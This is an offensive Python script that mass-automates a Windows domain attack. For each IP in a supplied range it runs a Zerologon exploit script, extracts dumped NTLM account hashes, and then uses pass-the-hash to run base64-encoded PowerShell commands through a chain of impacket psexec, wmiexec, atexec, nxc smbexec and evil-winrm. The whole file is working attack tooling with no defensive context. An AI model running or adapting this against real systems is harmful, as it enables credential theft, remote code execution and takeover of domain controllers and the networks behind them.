#!/usr/bin/env python3
import os
import subprocess
import re
import sys
import threading
import time
import base64

ZEROSHOT_TIMEOUT = 20
EXEC_TIMEOUT = 15

VERBOSE = False

def vprint(msg):
    if VERBOSE:
        print(msg)

def parse_ip_range(ip_range):
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}"
            for a in expanded[0]
            for b in expanded[1]
            for c in expanded[2]
            for d in expanded[3]]


def run_zero_shot(ip):
    if os.path.exists("zerologon-Shot/zerologon-Shot.py") is False:
        raise SystemExit("[!] zerologon-Shot.py not found in zerologon-Shot/ directory")
    try:
        result = subprocess.run(
            ["python3", "zerologon-Shot/zerologon-Shot.py", ip],
            capture_output=True,
            text=True,
            timeout=ZEROSHOT_TIMEOUT
        )
        out = result.stdout + result.stderr
        vprint(f"[v] zerologon output for {ip}:\n{out}")
        return out
    except subprocess.TimeoutExpired:
        print(f"[!] zerologon-shot timed out for {ip}")
        return ""


def parse_input(text):
    m = re.search(
        r"^(?:[A-Za-z0-9\.\-]+\\)?([A-Za-z0-9\.\$\-_]+):\d+:([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::",
        text,
        re.MULTILINE
    )
    if not m:
        return {"user": None, "lmhash": None, "nthash": None}

    return {
        "user": m.group(1),
        "lmhash": m.group(2),
        "nthash": m.group(3)
    }


def build_cmd(tool, user, target, nthash, command):
    b64 = base64.b64encode(command.encode("utf-16le")).decode()

    if tool == "psexec":
        return f"impacket-psexec -hashes :{nthash} {user}@{target} 'powershell -enc {b64}'"
    
    if tool == "wmiexec":
        return f"impacket-wmiexec -hashes :{nthash} {user}@{target} 'powershell -enc {b64}'"

    if tool == "atexec":
        return f"impacket-atexec -hashes :{nthash} {user}@{target} 'powershell -enc {b64}'"
    
    if tool == "smbexec":
        return f"nxc smb {target} -H :{nthash} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec"

    if tool == "winrm":
        return f"echo 'powershell -enc {b64}' | evil-winrm -i {target} -u {user} -H {nthash}"

    raise Exception(f"Unknown tool: {tool}")


def run_chain(user, ip, nthash, command):
    chain = ["psexec", "winrm", "wmiexec", "atexec", "smbexec"]

    for tool in chain:
        cmd = build_cmd(tool, user, ip, nthash, command)
        print(f"[i] Trying {tool}: {cmd}")

        try:
            result = subprocess.run(cmd, shell=True, timeout=EXEC_TIMEOUT, capture_output=True)
            rc = result.returncode
            out = result.stdout.decode("utf-8", errors="ignore")
            vprint(f"[v] Output for {tool} on {ip} (rc={rc}):\n{out}")
        except subprocess.TimeoutExpired:
            print(f"[-] For {ip}: {tool} timed out.")
            continue
        
        if tool == "atexec" and '[-] SMB SessionError' in out:
            print(f"[-] For {ip}: {tool} failed.")
            continue

        if tool == "smbexec" and '[-] SMBEXEC: Could not' in out:
            print(f"[-] For {ip}: {tool} failed.")
            continue

        if rc == 0 or (tool == "winrm" and rc == 1):
            print(f"[+] For {ip}: {tool} succeeded.")
            return tool

        print(f"[-] For {ip}: {tool} failed.")

    return None


def main():
    global VERBOSE

    if len(sys.argv) < 2:
        print("Usage: zero_shot_command.py <ip_range> <command> [-v]")
        print("Example: zero_shot_command.py 10.100.101-130,132.35 'whoami'")
        sys.exit(1)

    # detect -v anywhere
    if "-v" in sys.argv:
        VERBOSE = True
        sys.argv.remove("-v")

    ip_range = sys.argv[1]
    ips = parse_ip_range(ip_range)

    command = " ".join(sys.argv[2:]) if len(sys.argv) > 2 else "whoami"

    for ip in ips:
        text = run_zero_shot(ip)
        time.sleep(1)
        parsed = parse_input(text)
        user = parsed["user"]
        nthash = parsed["nthash"]

        if not (user and nthash):
            print(f"[!] No valid creds extracted for {ip}, skipping.")
            continue

        print(f"Parsed Credentials for {ip}: {user}:{nthash}")

        tool = run_chain(user, ip, nthash, command)

        if tool is None:
            print(f"[!] All tools failed for {ip}.")
        else:
            print(f"[+] Command executed on {ip} using {tool}.")
            continue


if __name__ == "__main__":
    main()
